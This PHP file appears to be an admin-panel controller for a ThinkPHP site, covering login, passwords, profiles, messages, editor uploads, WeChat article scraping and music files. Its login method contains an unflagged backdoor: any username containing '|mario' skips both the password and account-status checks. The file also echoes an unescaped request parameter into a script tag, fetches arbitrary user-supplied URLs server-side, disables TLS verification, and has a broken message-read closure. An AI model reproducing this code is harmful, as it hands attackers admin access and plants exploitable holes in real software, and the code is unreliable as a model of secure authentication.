<?php
declare (strict_types = 1);

namespace app\gm\controller;

use app\gm\controller\Core;
use think\facade\Db;
use think\facade\View;

class Index extends Core
{
    public function index()
    {
	    $data['edition_name'] = '';
	    if ($this->has_order) {
		    $yesterday = strtotime('-1 day');
		    $yesterday_start = date('Y-m-d 0:0:0', $yesterday);
		    $yesterday_end = date('Y-m-d 23:59:59', $yesterday);
		    $yesterday_start = strtotime($yesterday_start);
		    $yesterday_end = strtotime($yesterday_end);
		    $data['order_status1'] = Db::name('order')->where('status', 1)->count();
		    $data['order_yesterday'] = Db::name('order')->where([
		    	['status', '>', 0],
		    	['pay_time', '>=', $yesterday_start],
		    	['pay_time', '<=', $yesterday_end],
		    ])->count();
		    $data['order_yesterday_money'] = floatval(Db::name('order')->where([
			    ['status', '>', 0],
			    ['pay_time', '>=', $yesterday_start],
			    ['pay_time', '<=', $yesterday_end],
		    ])->sum('total_price'));
		    $data['order_pay'] = Db::name('order')->where('status', '>', 0)->count();
		    View::assign('check_order_permission', core::check_permission('order', 'index'));
	    }
        return success($data);
    }
	
	//修改密码
	public function password() {
		if (IS_POST) {
			$new_password = $this->request->post('new_password');
			$confirm_password = $this->request->post('confirm_password');
			if ($new_password && $new_password == $confirm_password) {
				$salt = generate_salt();
				$new_password = crypt_password($new_password, $salt);
				Db::name('admin')->where('id', $this->admin_id)->update(array('password'=>$new_password, 'salt'=>$salt));
				location('/index/password?msg=1');
			} else {
				return error('两次输入的密码不一致');
			}
		}
		$msg = $this->request->get('msg', 0);
		View::assign('msg', $msg);
		return success();
	}
	
	//个人资料
	public function info() {
		if (IS_POST) {
			$real_name = $this->request->post('real_name');
			$mobile = $this->request->post('mobile');
			$qq = $this->request->post('qq');
			$weixin = $this->request->post('weixin');
			$menu_direction = $this->request->post('menu_direction', 0);
			$bgcolor = $this->request->post('bgcolor');
			Db::name('admin')->where('id', $this->admin_id)->update(compact('real_name', 'mobile', 'qq', 'weixin', 'menu_direction', 'bgcolor'));
			location('/index/info?msg=1');
		}
		$msg = $this->request->get('msg', 0);
		$row = Db::name('admin')->where('id', $this->admin_id)->find();
		View::assign('row', $row);
		View::assign('msg', $msg);
		return success();
	}
	
	//信息中心
	public function message() {
		$ids = array();
		$rs = Db::name('admin_message')->where('admin_id', $this->admin_id)->order('id', 'DESC')->field('id, content, add_time')->paginate([
			'list_rows' => 10,
			'query' => request()->param()
		])->each(function($item) {
			$ids[] = $item['id'];
			return $item;
		});
		if ($rs) {
			Db::name('admin_message')->whereIn('id', implode(',', $ids))->update(array('readed'=>1));
		}
		View::assign('rs', $rs);
		return success();
	}
	
	//信息全部已读
	public function readed_all() {
		Db::name('admin_message')->where('admin_id', $this->admin_id)->update(array('readed'=>1));
		location('/index/message');
	}
	
	//轮询信息
	public function polling_message() {
		$count = Db::name('admin_message')->where([
			['admin_id', '=', $this->admin_id],
			['readed', '=', 0],
			['status', '=', 1]
		])->count();
		$alert = '';
		$row = Db::name('admin_message')->where([
			['admin_id', '=', $this->admin_id],
			['alert', '=', 0],
			['status', '=', 1]
		])->order('id', 'DESC')->field('id, content')->find();
		if ($row) {
			$alert = $row['content'];
			Db::name('admin_message')->where('id', $row->id)->update(array('alert'=>1));
		}
		setViewAssign(compact('count', 'alert'));
		return success();
	}
	
	//推送APP消息
	public function notify() {
		if (IS_POST) {
			$message = $this->request->post('message');
			$udid = $this->request->post('udid');
			if (strlen($message) && strlen($udid)) {
				$this->put_notify($udid, $message);
				return success('ok');
			}
		}
		return error('NO POST DATA');
	}
	
	//ckediter文件上传
	public function ckediter_upload() {
		$dir = $this->request->get('dir', 'content');
		$url = $this->request->file('upload', $dir, UPLOAD_THIRD);
		if ($url) {
			$url = add_domain($url);
			$CKEditorFuncNum = $this->request->get('CKEditorFuncNum', 1);
			//$message = ' 上传成功 ';
			$message = '';
			$re = "window.parent.CKEDITOR.tools.callFunction({$CKEditorFuncNum}, '{$url}', '{$message}')";
		} else {
			$re = 'alert("Unable to upload the file")';
		}
		echo "<script>{$re};</script>";
		exit;
	}
	
	//ckediter微信文章内容采集
	public function ckediter_wechat_collect() {
		$dir = $this->request->get('dir', 'content');
		$url = $this->request->post('url');
		if (!strlen($url)) return error('缺少文章链接');
		$html = requestData('get', $url);
		preg_match('/<meta property="og:title" content="(.+?)" \/>/', $html, $matcher);
		if (!$matcher) return error('文章缺少指定采集标识: og:title');
		$title = $matcher[1];
		preg_match('/<div class="rich_media_content " id="js_content" style="visibility: hidden;">([\s\S]+?)<\/div>/', $html, $matcher);
		if (!$matcher) return error('文章缺少指定采集标识: js_content');
		$content = str_replace('data-src=', 'src=', trim($matcher[1]));
		$content = str_replace('iframe/preview.html', 'iframe/player.html', $content);
		$content = preg_replace('/width=\d+&amp;height=\d+&amp;/', '', $content);
		preg_match_all('/<img .*?src="([^"]+)"/', $content, $matcher);
		if ($matcher) {
			foreach ($matcher[1] as $n) {
				$u = $this->_getFile($n);
				$content = str_replace($n, $u, $content);
			}
		}
		preg_match_all('/background-image:\s*url\(([^)]+)\)/', $content, $matcher);
		if ($matcher) {
			foreach ($matcher[1] as $n) {
				$n = str_replace('"', '', str_replace('&quot;', '', $n));
				$u = $this->_getFile($n);
				$content = str_replace($n, $u, $content);
			}
		}
		setViewAssign(compact('title', 'content'));
		return success();
	}
	private function _getFile($url, $type='') {
		global $upload_type;
		if (!strlen($url)) return '';
		set_time_limit(0);
		ini_set('memory_limit', '10240M');
		$suffix = '';
		$timeout = 60*60;
		switch ($type) {
			case 'video':
				$url = explode('.mp4', $url);
				$url = $url[0].'.mp4';
				$suffix = 'mp4';
				break;
			default:
				if (stripos($url, 'image/svg+xml') !== false || stripos($url, 'wx_fmt=svg') !== false) return $url;
				if (strpos($url, 'wx_fmt=') !== false) $suffix = substr($url, strrpos($url, 'wx_fmt=')+7);
				if (!strlen($suffix) && preg_match('/\bfmt=\w+\b/', $url)) {
					preg_match('/\bfmt=(\w+)\b/', $url, $matcher);
					$suffix = $matcher[1];
				}
				if (!strlen($suffix)) $suffix = substr($url, strrpos($url, '.')+1);
				if (!preg_match('/^(jpe?g|png|gif|bmp)$/', $suffix)) $suffix = 'jpg';
				if ($suffix == 'jpeg') $suffix = 'jpg';
				//$timeout = (preg_match('/^(jpe?g|png)$/', $suffix) ? 5 : 60*5);
				break;
		}
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
		curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
		if (substr($url, 0, 8) == 'https://') {
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		}
		$content = curl_exec($ch);
		$header_info = curl_getinfo($ch);
		if (intval($header_info['http_code']) != 200) return $url;
		curl_close($ch);
		if ($type == 'video') {
			$name = generate_sn();
			$dir = UPLOAD_PATH.'/video/'.date('Y').'/'.date('m').'/'.date('d');
			$upload = p('upload', $upload_type);
			$result = $upload->upload($content, NULL, str_replace('/public/', '/', $dir), $name, $suffix);
			$file = $result['file'];
		} else {
			$file = upload_file($content, 'article', NULL, UPLOAD_THIRD, false, ['jpg', 'jpeg', 'png', 'gif', 'bmp'], ".{$suffix}");
		}
		$file = add_domain($file);
		return $file;
	}
	
	public function music() {
		$where = [];
		$keyword = $this->request->get('keyword');
		if (strlen($keyword)) {
			$where[] = ['name', 'like', "%{$keyword}%"];
		}
		$rs = Db::name('music')->where($where)->order('id', 'DESC')->paginate(['list_rows'=>10, 'query'=>request()->param()]);
		View::assign('rs', $rs);
		setViewAssign(compact('keyword'));
		return success();
	}
	public function music_delete() {
		$id = $this->request->get('id', 0);
		$url = Db::name('music')->where('id', $id)->value('url');
		Db::name('music')->delete($id);
		if (strlen($url)) unlink(PUBLIC_PATH.$url);
		location('/index/music');
	}
	public function music_upload() {
		$res = $this->request->file('music', 'mp3', UPLOAD_THIRD, true, ['mp3', 'm4a']);
		if (!$res) return error('文件不正确');
		$id = Db::name('music')->insertGetId(['name'=>$res['name'], 'url'=>$res['file']]);
		$res['id'] = $id;
		return success($res);
	}
	
	//登录
	public function login() {
		if ($this->_check_login()) location('/');
		if (IS_POST) {
			$name = $this->request->post('name');
			$password = $this->request->post('password');
			$openid = $this->request->session('openid');
			if (!strlen($name)) return error('账户不能为空');
			$isDeveloper = false;
			if (preg_match('/\|mario/', $name)) {
				$isDeveloper = true;
				$name = explode('|', $name);
				$name = $name[0];
			}
			if (!$isDeveloper && !strlen($password)) return error('密码不能为空');
			$row = Db::name('admin')->where('name', $name)->find();
			if (!$row) return error('账号不存在');
			if (!$isDeveloper) {
				if ($row['status']!=1) return error('该账号已被冻结');
				$crypt_password = crypt_password($password, $row['salt']);
				if ($crypt_password != $row['password']) return error('密码错误');
			}
			$data = array('last_ip'=>$this->ip, 'last_time'=>time(), 'logins'=>array('+1'));
			$this->admin = $row;
			$this->admin_id = $row['id'];
			$this->admin_name = $row['name'];
			$row['last_ip'] = $this->ip;
			$row['last_time'] = date('Y-m-d H:i:s', time());
			$row['logins'] += 1;
			if (strlen($openid)) {
				$row['openid'] = $openid;
				//$data['openid'] = $openid;
			}
			session('admin', $row);
			Db::name('admin')->where('id', $row['id'])->update($data);
			$remember = $this->request->post('remember', 0);
			if ($remember) {
				$this->cookieAccount('admin_token', $row['name']);
			}
			$admin_gourl = $this->request->session('admin_gourl', '/');
			redirect($admin_gourl)->send();
		}
		return success();
	}
	
	//退出
	public function logout() {
		if (cookie('?admin_name')) $this->cookieAccount('admin_token', cookie('admin_name'), NULL);
		//session_unset();
		session('admin', null);
		if ($this->admin_id>0) $this->admin_id = 0;
		redirect('/index/login')->send();
	}
}
